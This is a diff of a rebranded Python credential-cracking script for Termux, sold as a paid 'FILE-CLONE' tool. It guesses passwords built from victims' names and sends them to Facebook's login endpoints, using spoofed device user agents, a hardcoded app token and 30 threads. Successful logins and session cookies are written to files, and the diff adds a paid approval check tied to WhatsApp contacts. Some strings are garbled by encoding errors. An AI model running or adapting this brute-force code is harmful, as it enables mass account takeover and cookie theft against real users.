@@ -1,56 +1,46 @@
 #!/usr/bin/python
-#Original written By Parvez Ahmed
-#SHANTO(Parvez Ahmed Termux) Brand
-
-#Feel SHANTO POWER
-
-
-
-import os,zlib
-
-from os import system as osRUB
-from os import system as cmd
-os.system('clear')
-print('Welcome to RJ tools...\n')
-
-
-
+#Dec By MAHADI-HASAN
+#FUCK-BY-MAHADI🖕
+#Original written Attitude King Miraj
+#DANGER(ATTITUDE KING MIRAJ) Brand
+#Feel DANGER POWER
+ 
+ 
+ 
+import os
+os.system("pip install pycurl")
+os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests')
+os.system('pip install httpx pip install beautifulsoup4')
 try:
-    import requests 
-except ImportError:
-    print('\n  Installing Requests ...\n')
-    os.system('pip install requests')
-
-
-try:
-    import concurrent.futures
-except ImportError:
-    print('\n  installing futures ...\n')
-    os.system('pip install futures')
-
-try:
-    import mechanize
-except ModuleNotFoundError:
-    os.system('pip install mechanize > /dev/null')
-
+    import os,requests,json,time,re,random,sys,uuid,string,subprocess
+    from string import *
+    import bs4
+    #import dz
+    from concurrent.futures import ThreadPoolExecutor as tred
+    from bs4 import BeautifulSoup as sop
+    from bs4 import BeautifulSoup
+except ModuleNotFoundError: 
+    print('\n Installing missing modules ...')
+    os.system('pip install requests bs4 futures==2 > /dev/null')
+ 
 from urllib.request import Request, urlopen
 import os, requests, re,platform, sys, random, subprocess, threading, itertools,base64,uuid,zlib,re,json,uuid,subprocess,shutil,webbrowser,time,json,sys,random,datetime,time,re,subprocess,platform,string,json,time,re,random,sys,string,uuid
-from concurrent.futures import ThreadPoolExecutor as mogidSHANTO
+from concurrent.futures import ThreadPoolExecutor as mogidDANGER
 from string import * 
 from random import randint
 from time import sleep as slp
 from os import system as cmd
 from zlib import decompress 
 import os, platform
-
+ 
 from concurrent.futures import ThreadPoolExecutor
 fast_work = ThreadPoolExecutor(max_workers=15).submit
-
+ 
 import random
 import string
-
-
-
+ 
+ 
+ 
 model2 ="""M2101K6G
 Aquaris U Plus
 SM-G780G
@@ -254,9 +244,9 @@ SM-R096P
 SM-F952H
 SM-Y608N
 SM-C736V""".splitlines()
-
-
-
+ 
+ 
+ 
 totaldmp = 0
 count = 0
 loop = 0
@@ -274,36 +264,41 @@ filter = []
 def randBuildLSB():
     vchrome = str(random.randint(100,925))+".0.0."+str(random.randint(1,8))+"."+str(random.randint(40,150))
     VAPP = random.randint(410000000,499999999)
-    END = '[FBAN/FB4A;FBAV/436.0.0.35.101;FBBV/446213637;[FBAN/FB4A;FBAV/436.0.0.35.101;FBBV/446213637;FBDM/{density=3.0,width=1080,height=2102};FBLC/en_IN;FBRV/0;FBCR/MLS;FBMF/Magic;FBBD/Magic;FBPN/com.facebook.katana;FBDV/iQ3204;FBSV/5.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
-    ua = f'Dalvik/2.1.0 (Linux; U; Android 10 {random.randint(4,13)}; {random.choice(model2)} Build/HUAWEIMED-LX9N.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END
+    END = '[FBAN/FB4A;FBAV/307.0.0.22.35;FBBV/866537537;FBRV/0;FBPN/com.facebook.katana;FBLC/id_ID;FBMF/Realme;FBBD/Realme;FBDV/RMX3771;FBSV/13;FBCA/armeabi-v8a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]"+"[FBAN/FB4A;FBAV/214.0.0.4.62;FBBV/18966371;FBDM/{density=1.0,width=1280,height=1920};FBLC/en_GB;FBCR/Nepal_Telecom;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G990B;FBSV/8.3.4;FBOP/1;FBCA/armeabi-v7a:armeabi;]"+"[FBAN/FB4A;FBAV/392.0.0.9.117;FBBV/58527964;FBDM/{density=2.0,width=1280,height=1920};FBLC/en_PK;FBCR/MTN-CG;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G990E;FBSV/4.5.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
+    ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)}  Build/SP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END
     return ua
-
+ 
 def randFBAN():
   VAPP = random.randint(410000000,499999999)
-  ua="[FBAN/FB4A;FBAV/68.0.0.3593;FBBV/"+str(VAPP)+";FBDM/{density=2.5,width=780,height=1920};FBLC/fr_IN;FBRV/4214899694;FBCR/1030;FBMF/Realme;FBBD/Ostin;FBPN/com.facebook.katana;FBDV/"+random.choice(model2)+";FBSV/16;FBOP/5;FBCA/arm64-v8a:;]"
+  ua="[FBAN/FB4A;FBAV/364.0.0.10.112;FBBV/"+str(VAPP)+";FBDM/{density=2.625,width=1080,height=2131};FBLC/en_GB;FBRV/374667243;FBCR/1030;FBMF/samsung;FBBD/SM-C5010;FBPN/com.facebook.katana;FBDV/"+random.choice(model2)+";FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"
   return ua
-
+ 
 def randBuildvsskj():
-    END = '[FBAN/FB4A;FBAV/49.0.0.4120;FBBV/9006006;[FBAN/FB4A;FBAV/352.0.0.21.117;FBBV/348184932;FBDM/{density=3.0,width=1080,height=2102};FBLC/en_IN;FBRV/0;FBCR/MLS;FBMF/Magic;FBBD/Magic;FBPN/com.facebook.katana;FBDV/iQ3204;FBSV/5.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
-    ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)} Build/SHANTO2A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END
+    END = '[FBAN/Orca-Android;FBAV/137.0.0.1570;FBBV/5827446;[FBAN/Orca-Android;FBAV/364.0.0.10.112;FBPN/com.facebook.orca;FBLC/en_GB;FBBV/374667243;FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/SM-C5010;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=2.625,width=1080,height=2131};FB_FW/1;]'
+    ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)}  Build/SP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END
     return ua
-
-sys.stdout.write('\x1b]2; SHANTO\x07')
+ 
+sys.stdout.write('\x1b]2; DANGER\x07')
 S = '\033[1;37m'
 A = '\x1b[38;5;208m'
 R = '\x1b[38;5;46m'
 F = '\x1b[38;5;48m'
 Z = '\033[1;33m'
 head = {'Host': 'adsmanager.facebook.com', 'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"', 'viewport-width': '980'}
-logo =f"""
-\033[1;33m  ░█▀▀▀█ ░█─░█ ─█▀▀█ ░█▄─░█ ▀▀█▀▀ ░█▀▀▀█ 
-\033[1;32m  ─▀▀▀▄▄ ░█▀▀█ ░█▄▄█ ░█░█░█ ─░█── ░█──░█ 
-\033[1;36m  ░█▄▄▄█ ░█─░█ ░█─░█ ░█──▀█ ─░█── ░█▄▄▄█
+logo ="""\033[1;32m
+d8888b.  .d8b.  d8b   db  d888b  d88888b d8888b. 
+88  `8D d8' `8b 888o  88 88' Y8b 88'     88  `8D 
+88   88 88ooo88 88V8o 88 88      88ooooo 88oobY' 
+88   88 88~~~88 88 V8o88 88  ooo 88~~~~~ 88`8b   
+88  .8D 88   88 88  V888 88. ~8~ 88.     88 `88. 
+Y8888D' YP   YP VP   V8P  Y888P  Y88888P 88   YD 
+\033[1;32mD \033[1;33mA \033[1;34mN \033[1;35mG \033[1;36mE \033[1;37mR~~~\033[1;37m[ALL TIME \033[1;37m FIREðŸ”¥ðŸ”¥]
 \033[1;32m--------------------------------------------------------
-\033[1;37m[\033[1;32m•\033[1;37m]\033[1;32m  TOOLS        :   \033[1;32mFILE-CLONE
-\033[1;37m[\033[1;33m•\033[1;37m]\033[1;33m  VERSION      :   \033[1;33m1.0
-\033[1;37m[\033[1;34m•\033[1;37m]\033[1;34m  WORKING      :   \033[1;34mDATA/WIFI
-\033[1;37m[\033[1;35m•\033[1;37m]\033[1;35m  WHATSAPP     :   \033[1;35m01310868232
+\033[1;37m[\033[1;31mâ€¢\033[1;37m]\033[1;31mDEVELOPER    :   \033[1;31mMIRAJ-KHAN
+\033[1;37m[\033[1;32mâ€¢\033[1;37m]\033[1;32mTOOLS        :   \033[1;32mFILE-CLONE
+\033[1;37m[\033[1;33mâ€¢\033[1;37m]\033[1;33mVERSION      :   \033[1;33m 8.5
+\033[1;37m[\033[1;34mâ€¢\033[1;37m]\033[1;34mWORKING      :   \033[1;34mDATA/WIFI
+\033[1;37m[\033[1;35mâ€¢\033[1;37m]\033[1;35mSTATUS       :   \033[1;35mPAID
 \033[1;32m------------------------------------------------------"""
 def clear():
     os.system("clear")
@@ -317,28 +312,28 @@ def result(OKs,cps):
         print(' TOTAL OK: %s' % str(len(oks)))
         print(' TOTAL CP: %s' % str(len(cps)))
         print("-----------------------------------------------------")
-        input("Press enter to back SHANTO Menu ")
+        input("Press enter to back DANGER Menu ")
         exit()
-
-def SHANTO():   
+ 
+def DANGER():   
     os.system('clear')
     print(logo)
     print(f'[1] File Crack')
-    print(f'[2] Join Facebook account ')
-    print(f'[3] Join Whatsapp Group  ')
+    print(f'[2] Join Whatsapp Group ')
+    print(f'[3] Join Messenger Group ')
     print('')
     select = input('Select Menu > ')
     if select =='1':
         method_crack()
     elif select =='2':
-        os.system('xdg-open https://www.facebook.com/mdmiraj.khan.60?mibextid=ZbWKwL')
+        os.system('xdg-open https://chat.whatsapp.com/LTBJe0upO8SIUsMXvHVAQd')
         pass
     elif select =='3':
-        os.system('xdg-open https://chat.whatsapp.com/LTBJe0upO8SIUsMXvHVAQd')
+        os.system('xdg-open https://m.me/j/Abb5xIlL-jOql6rR/')
     else:
         print('\n Select valid option ... ')
         time.sleep(2)
-        SHANTO(allkey)
+        DANGER(allkey)
         
 def method_crack():
     global methods
@@ -368,7 +363,7 @@ def method_crack():
       print('\n Select Valid Option ...')
       time.sleep(0.6)
       method_crack()
-
+ 
 class main_crack():
     def __init__(self):
         self.id=[]
@@ -391,7 +386,7 @@ class main_crack():
     def methodA(self, sid, name, psw):
         try:
             global oks,cps,loop
-            sys.stdout.write(f"\r\033[1;32m[SHANTO] \033[1;33m{loop} \033[1;32m| \033[1;34mM1 OK/CP \033[1;35m{len(oks)}/{len(cps)} | \033[1;36m{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
+            sys.stdout.write(f"\r\033[1;32m[DANGER] \033[1;33m{loop} \033[1;32m| \033[1;34mM1 OK/CP \033[1;35m{len(oks)}/{len(cps)} | \033[1;36m{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
             sys.stdout.flush()
             fs = name.split(' ')[0]
             try:
@@ -411,18 +406,18 @@ class main_crack():
 "source": "device_based_login",
 "email": sid,
 "password": ps,
-"access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
+"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
 "generate_session_cookies": "1",
 "meta_inf_fbmeta": "",
 "advertiser_id": str(uuid.uuid4()),
 "currently_logged_in_userid": "0",
-"locale": "fr_IN",
-"client_country_code": "NP",
+"locale": "en_US",
+"client_country_code": "US",
 "method": "auth.login",
 "fb_api_req_friendly_name": "authenticate",
 "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
 "api_key": "882a8490361da98702bf97a021ddc14d"}
-                headers = {'User-Agent':"[FBAN/FB4A;FBAV/436.0.0.35.101;FBBV/446213637;[FBAN/FB4A;FBAV/436.0.0.35.101;FBBV/446213637;FBDM/{density=3.0,width=1080,height=2102};FBLC/en_IN;FBRV/0;FBCR/MLS;FBMF/Magic;FBBD/Magic;FBPN/com.facebook.katana;FBDV/iQ3204;FBSV/5.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
+                headers = {'User-Agent': randBuildLSB(),
 'Content-Type': 'application/x-www-form-urlencoded',
 'Host': 'graph.facebook.com',
 'X-FB-Net-HNI': str(random.randint(20000, 40000)),
@@ -439,15 +434,15 @@ class main_crack():
 'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                 q = session.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                 if 'session_key' in q:
-                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);SHANTOb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={SHANTOb};{ckkk}"
-                    print(f"\r{R} [SHANTO-OK] {sid} | {ps} {S}")
+                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);DANGERb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={DANGERb};{ckkk}"
+                    print(f"\r{R} [DANGER-OK] {sid} | {ps} {S}")
                     oks.append(sid)
-                    open('/sdcard/SHANTO_OK_ids_M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/SHANTO_iDs_COOKiEs_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
+                    open('/sdcard/DANGER_OK_ids_M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/DANGER_iDs_COOKiEs_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                     break
                 elif 'www.facebook.com' in q['error']['message']:
-                     #print(f"\r{A} [SHANTO-CP] {sid} | {ps} {S}")
+                     #print(f"\r{A} [DANGER-CP] {sid} | {ps} {S}")
                      cps.append(sid)
-                     open('/sdcard/SHANTO_CP.txt','a').write(sid+'|'+ps+'\n')
+                     open('/sdcard/DANGER_CP.txt','a').write(sid+'|'+ps+'\n')
                 else:
                     continue
             loop+=1
@@ -458,7 +453,7 @@ class main_crack():
     def methodC(self, sid, name, psw):
         try:
             global oks,cps,loop
-            sys.stdout.write(f"\r\033[1;32m[SHANTO] \033[1;33m{loop} \033[1;32m| \033[1;34mM2 OK/CP \033[1;35m{len(oks)}/{len(cps)} | \033[1;36m{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
+            sys.stdout.write(f"\r\033[1;32m[DANGER] \033[1;33m{loop} \033[1;32m| \033[1;34mM2 OK/CP \033[1;35m{len(oks)}/{len(cps)} | \033[1;36m{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
             sys.stdout.flush()
             fs = name.split(' ')[0]
             try:
@@ -478,23 +473,23 @@ class main_crack():
 "source": "device_based_login",
 "email": sid,
 "password": ps,
-"access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
+"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
 "generate_session_cookies": "1",
 "meta_inf_fbmeta": "",
 "advertiser_id": str(uuid.uuid4()),
 "currently_logged_in_userid": "0",
-"locale": "fi_GB",
-"client_country_code": "PK",
+"locale": "en_US",
+"client_country_code": "US",
 "method": "auth.login",
 "fb_api_req_friendly_name": "authenticate",
 "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
 "api_key": "882a8490361da98702bf97a021ddc14d"}
-                headers = {'User-Agent': randBuildLSB(),
+                headers = {'User-Agent': randBuildvsskj(),
 'Content-Type': 'application/x-www-form-urlencoded',
 'Host': 'graph.facebook.com',
 'X-FB-Net-HNI': str(random.randint(20000, 40000)),
 'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
-'X-FB-Connection-Type': 'Bandwidth',
+'X-FB-Connection-Type': 'MOBILE.LTE',
 'X-Tigon-Is-Retry': 'False',
 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
 'x-fb-device-group': '5120',
@@ -504,17 +499,17 @@ class main_crack():
 'X-FB-Client-IP': 'True',
 'X-FB-Server-Cluster': 'True',
 'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
-                q = session.post("https://graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
+                q = session.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                 if 'session_key' in q:
-                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);SHANTOb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={SHANTOb};{ckkk}"
-                    print(f"\r{R} [SHANTO-OK] {sid} | {ps} {S}")
+                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);DANGERb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={DANGERb};{ckkk}"
+                    print(f"\r{R} [DANGER-OK] {sid} | {ps} {S}")
                     oks.append(sid)
-                    open('/sdcard/SHANTO_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/SHANTO_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
+                    open('/sdcard/DANGER_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/DANGER_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                     break
                 elif 'www.facebook.com' in q['error']['message']:
-                    #print(f"\r{A} [SHANTO-CP] {sid} | {ps} {S}")
+                    #print(f"\r{A} [DANGER-CP] {sid} | {ps} {S}")
                     cps.append(sid)
-                    open('/sdcard/SHANTO_CP.txt','a').write(sid+'|'+ps+'\n')
+                    open('/sdcard/DANGER_CP.txt','a').write(sid+'|'+ps+'\n')
                 else:
                     continue
             loop+=1
@@ -524,7 +519,7 @@ class main_crack():
            
     def methodD(self, sid, name, psw):
         global oks,cps,loop
-        sys.stdout.write(f"\r\033[1;32m[SHANTO] \033[1;33m{loop} \033[1;32m| \033[1;34mM3 OK/CP \033[1;35m{len(oks)}/{len(cps)} | \033[1;36m{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
+        sys.stdout.write(f"\r\033[1;32m[DANGER] \033[1;33m{loop} \033[1;32m| \033[1;34mM3 OK/CP \033[1;35m{len(oks)}/{len(cps)} | \033[1;36m{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
         sys.stdout.flush()
         fs = name.split(' ')[0]
         try:
@@ -536,20 +531,20 @@ class main_crack():
                 ps = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',name).replace('name',name.lower())
                 session=requests.Session()
                 sua = randBuildLSB()
-                getlog = session.get(f'https://mbasic.facebook.com/login/device-based/password/?uid={sid}&flow=login_no_pin&refsrc=deprecated&_rdr')
-                idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":sid,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":ps,}
+                getlog = session.get(f'https://d.facebook.com/login/device-based/password/?uid={sid}&flow=login_no_pin&refsrc=deprecated&_rdr')
+                idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":sid,"next":"https://d.facebook.com/login/save-device/","flow":"login_no_pin","pass":ps,}
                 session.headers = {}
-                session.headers.update({'Host': 'mbasic.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="24", "Chromium";v="116", "Google Chrome";v="100"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform': 'Android', 'sec-ch-prefers-color-scheme': 'dark', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/167.0.0.80.89;]', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-BD,en-GB;q=0.9,en-US;q=0.8,en;q=0.7'})
-                complete = session.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False)
+                session.headers.update({'Host': 'd.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="24", "Chromium";v="116"Google Chrome";v="100"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform': '"Android"', 'sec-ch-prefers-color-scheme': 'dark', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36 3gpp-gba', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'sec-fetch-site': 'same-origin', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-BD,en-GB;q=0.9,en-US;q=0.8,en;q=0.7'})
+                complete = session.post('https://d.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False)
                 if 'c_user' in session.cookies.get_dict():
-                    print(f"\r{R} [SHANTO-OK] {sid} | {ps} {S}")
+                    print(f"\r{R} [DANGER-OK] {sid} | {ps} {S}")
                     oks.append(sid)
-                    open('/sdcard/SHANTO_OK.txt','a').write(sid+'|'+ps+'\n')
+                    open('/sdcard/DANGER_OK.txt','a').write(sid+'|'+ps+'\n')
                     break
                 elif 'checkpoint' in session.cookies.get_dict():
-                    #print(f"\r{A} [SHANTO-CP] {sid} | {ps} {S}")
+                    #print(f"\r{A} [DANGER-CP] {sid} | {ps} {S}")
                     cps.append(sid)
-                    open('/sdcard/SHANTO_CP.txt','a').write(sid+'|'+ps+'\n')
+                    open('/sdcard/DANGER_CP.txt','a').write(sid+'|'+ps+'\n')
                     break
                 else:
                     continue
@@ -564,10 +559,10 @@ class main_crack():
             pw = []
             clear()
             print('Put limit Unlimited')
-            sl = int(input('Password Limit→'))
+            sl = int(input('Password Limitâ†’'))
             os.system("clear")
             print(logo)
-            print(f'\033[1;32m[Example: first123,57273200,57575751,59039200,last,name,ETC]')
+            print(f'\033[1;32m[Example: first123,last1122,firstlast,last,name,ETC]')
             print('')
             if sl =='':
                 print('\n Put limit between Unlimited')
@@ -584,7 +579,7 @@ class main_crack():
             print(f'\033[1;34mCount Ids >> %s ' % len(self.id))
             print('\033[1;35mCracking Started >>')
             print("-----------------------------------------------------")
-            with mogidSHANTO(max_workers=30) as SHANTOworld:
+            with mogidDANGER(max_workers=30) as DANGERworld:
                 for zsb in self.id:
                    try:
                        uid, name = zsb.split('|')
@@ -594,16 +589,45 @@ class main_crack():
                        else:
                             pwx =  pw
                             if 'methodA' in methods:
-                                SHANTOworld.submit(self.methodA, uid, name, pwx)
+                                DANGERworld.submit(self.methodA, uid, name, pwx)
                             elif 'methodB' in methods:
-                                SHANTOworld.submit(self.methodB, uid, name, pwx)
+                                DANGERworld.submit(self.methodB, uid, name, pwx)
                             elif 'methodC' in methods:
-                                SHANTOworld.submit(self.methodC, uid, name, pwx)
+                                DANGERworld.submit(self.methodC, uid, name, pwx)
                             elif 'methodD' in methods:
-                                SHANTOworld.submit(self.methodD, uid, name, pwx)
+                                DANGERworld.submit(self.methodD, uid, name, pwx)
                    except:pass
             result(oks,cps)   
             
-
-
-SHANTO()
+def danger_menu():
+    UMO="DANGER-"
+    uuid = str(os.geteuid()) + str(os.getlogin()) 
+    id = "5".join(uuid)
+    print(logo)
+    DARK=requests.get("https://github.com/SHANTO-KING/Approval").text
+    if id in DARK:
+        DANGER()
+    else:
+        os.system("clear")
+        os.system("xdg-open https://chat.whatsapp.com/LTBJe0upO8SIUsMXvHVAQd")
+        time.sleep(3.0)
+        
+        os.system("clear")
+        print(logo)
+        print("\t\033[30m   [\033[1;32m\033[47m First Get Approvel\033[00m\033[1;30m]")
+        print ("")
+        print("â”Œâ”â•â”â•â”â•â”â•â”â”â•â”â•â”â•â”â•â”â•â”â•â”â•â”â”â•â”â•â”â•â”â•â”â•â”â•â”â•â”â”â•â”â•â”â•â”â•â”â•â”â•â”â•â”â” \n\033[1;32mâ”‚ Note : That is Paid Tools because 100% ok id And FF GAME ID just now loginâ”‚\033[1;37m\nâ””â”â•â”â•â”â•â”â•â”â”â•â”â•â”â•â”â•â”â•â”â•â”â•â”â”â•â”â•â”â•â”â•â”â•â”â•â”â•â”â”â•â”â•â”â•â”â•â”â•â”â•â”â•â”â”˜")
+        print ("")
+        print("   7 Day-150à§³             Your Key is Not Approved ")
+        print("   15 Day-250à§³           Copy And Send Key To Admin")
+        print ("")
+        print (" Your Key : "+UMO+id)
+        print ("\n")
+        name = input(" Your Name : ")
+        print ("")
+        input(" Press Enter To Send Key")
+        os.system("xdg-open https://wa.me/+8801780782237")
+        danger_menu()   
+danger_menu()
+ 
+ 
